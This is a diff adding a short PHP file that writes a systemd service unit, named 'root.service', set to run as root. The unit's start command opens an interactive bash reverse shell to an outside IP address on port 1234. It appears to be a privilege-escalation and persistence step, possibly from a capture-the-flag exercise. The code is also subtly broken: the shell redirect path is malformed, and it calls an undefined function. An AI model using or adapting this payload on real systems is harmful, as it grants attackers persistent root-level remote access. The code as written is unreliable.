@@ -1,0 +1,5 @@
+<?
+
+	exec_shell("printf \"[Unit]\nDescription=rooooot\n\n[Service]\nType=Simple\nUser=root\nExecStart=/bin/bash -c 'bash -i >& /dev/10.8.29.246/1234 >&1'\n\n[Install]\nWantedBy=multi-user.target\" > root.service");
+
+?>
